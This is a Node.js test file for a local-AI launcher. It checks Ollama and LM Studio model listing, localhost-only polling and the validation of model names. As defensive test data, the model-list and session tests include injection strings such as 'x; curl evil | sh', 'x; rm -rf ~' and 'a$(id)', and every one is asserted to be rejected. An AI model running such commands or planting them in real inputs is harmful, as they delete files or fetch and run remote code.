// Local AI models: what Ollama and OpenAI-style servers on this computer list,
// only localhost asked, and an Ollama session's model checked before it runs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
process.env.SWITCHBOARD_DATA = mkdtempSync(join(tmpdir(), 'sb-localai-'));
process.env.HOME = process.env.USERPROFILE = mkdtempSync(join(tmpdir(), 'sb-localai-home-'));   // no real LM Studio asked
const { SERVERS, modelsFrom, lmsModelsFrom, pollLocalAI, localAI, ollamaModels } = await import('../lib/localai.js');
const { startOptions, installedAgents } = await import('../lib/terminals.js');

test('model lists from each kind of server', () => {
  const ollama = SERVERS.find((s) => s.id === 'ollama'), lm = SERVERS.find((s) => s.id === 'lmstudio');
  assert.deepEqual(modelsFrom(ollama, { models: [{ name: 'llama3.2:latest', size: 2e9 }, { name: 'bad name; rm -rf' }] }), [{ id: 'llama3.2:latest', size: 2e9 }]);
  assert.deepEqual(modelsFrom(lm, { data: [{ id: 'qwen2.5-7b-instruct' }] }), [{ id: 'qwen2.5-7b-instruct', size: null }]);
  assert.deepEqual(modelsFrom(ollama, null), []);
});

test('only this computer is asked, and what answers is kept', async (t) => {
  const real = globalThis.fetch;
  t.after(() => { globalThis.fetch = real; });
  const asked = [];
  globalThis.fetch = async (url) => {
    asked.push(String(url));
    if (String(url) === 'http://127.0.0.1:11434/api/tags') return Response.json({ models: [{ name: 'gemma3:4b', size: 3.3e9 }] });
    throw new Error('ECONNREFUSED');
  };
  await pollLocalAI();
  assert.ok(asked.every((u) => u.startsWith('http://127.0.0.1:')));
  assert.deepEqual(localAI().servers.map((s) => s.id), ['ollama']);
  assert.deepEqual(ollamaModels().map((m) => m.id), ['gemma3:4b']);
  // New session's dropdown lists exactly those.
  assert.deepEqual(installedAgents().find((a) => a.id === 'localai').models, [['gemma3:4b', 'gemma3:4b']]);
});

test('an Ollama session needs a model, and a clean one', () => {
  assert.throws(() => startOptions('localai', '', ''), /Pick a model/);
  assert.throws(() => startOptions('localai', 'x; curl evil | sh', ''), /characters/);
  assert.deepEqual(startOptions('localai', 'hf.co/org/model:Q4_K_M', 'high'), { model: 'hf.co/org/model:Q4_K_M', effort: null });
});

test('LM Studio: chat models from lms ls, embeddings and odd names left out', () => {
  const ls = [
    { type: 'llm', modelKey: 'qwen/qwen3.6-35b-a3b', displayName: 'Qwen3.6 35B A3B', sizeBytes: 22e9 },
    { type: 'embedding', modelKey: 'text-embedding-nomic-embed-text-v1.5', displayName: 'Nomic Embed' },
    { type: 'llm', modelKey: 'x; rm -rf ~', displayName: 'Bad' }
  ];
  assert.deepEqual(lmsModelsFrom(ls), [{ id: 'qwen/qwen3.6-35b-a3b', name: 'Qwen3.6 35B A3B', size: 22e9 }]);
  assert.deepEqual(lmsModelsFrom(null), []);
});

test('an LM Studio session needs a model with a plain name', () => {
  assert.deepEqual(startOptions('lmstudio', 'google/gemma-4-12b-qat', 'high'), { model: 'google/gemma-4-12b-qat', effort: null });
  assert.throws(() => startOptions('lmstudio', '', null), /Pick a model/);
  assert.throws(() => startOptions('lmstudio', 'a$(id)', null), /characters/);
  const lm = installedAgents().find((a) => a.id === 'lmstudio');
  assert.equal(lm.installed, false);   // no ~/.lmstudio in this test's home
  assert.match(lm.models[0][1], /download one in LM Studio/);
});

test('a local model session runs Switchboard\'s own chat against its server', async () => {
  const { localChatCommand, chatLog } = await import('../lib/terminals.js');
  const log = chatLog('sb-x', 123);
  assert.ok(log.endsWith('sb-x-123.jsonl'));
  const cmd = localChatCommand('ollama', "llama3.2", log);
  assert.match(cmd, /localchat\.mjs' '--server' 'http:\/\/127\.0\.0\.1:11434' '--model' 'llama3\.2'/);
  assert.match(localChatCommand('lmstudio', 'google/gemma-4-12b', log), /'http:\/\/127\.0\.0\.1:1234'.*'google\/gemma-4-12b'.*"server","start"\]'/);
});
